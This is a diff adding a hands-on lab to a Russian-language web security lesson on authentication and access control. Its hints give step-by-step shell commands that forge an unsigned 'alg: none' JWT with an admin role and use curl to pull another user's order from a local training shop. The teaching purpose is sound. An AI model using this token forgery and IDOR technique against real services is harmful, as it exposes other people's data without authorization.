@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Разбираем сессии и токены, ломаем JWT, находим IDOR/BOLA и обходим контроль доступа по-настоящему."
+lab:
+  kind: shell
+  title: 'Практика: JWT alg:none + IDOR'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, token.txt]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Токен в `token.txt`. Посмотри payload: `cut -d. -f2 token.txt | base64 -d`.'
+    - 'Сервер не проверяет подпись — примет `alg: none`. Собери новый заголовок: `echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0`.'
+    - 'Собери payload админа (чужой sub): `echo -n ''{"sub":"1","role":"admin"}'' | base64 -w0`.'
+    - 'Задай `export H=<hdr>` и `export P=<pay>`, затем: `curl -s https://shop.local/api/orders/1002 -H "Authorization: Bearer $H.$P." | tail -1 > found.txt`, затем `check`.'
 ---
 
 Пока мы ломали разбор ввода (файлы, XML, URL), мы не задавали базовый вопрос: **кто ты и что тебе можно**. А ведь большинство реальных утечек — это не RCE, а доступ к чужим данным: пользователь подменяет номер заказа и видит чужой. Это класс **контроля доступа**, и он стоит первым в OWASP Top 10. Сегодня разберём аутентификацию (сессии, JWT) и авторизацию (IDOR/BOLA).
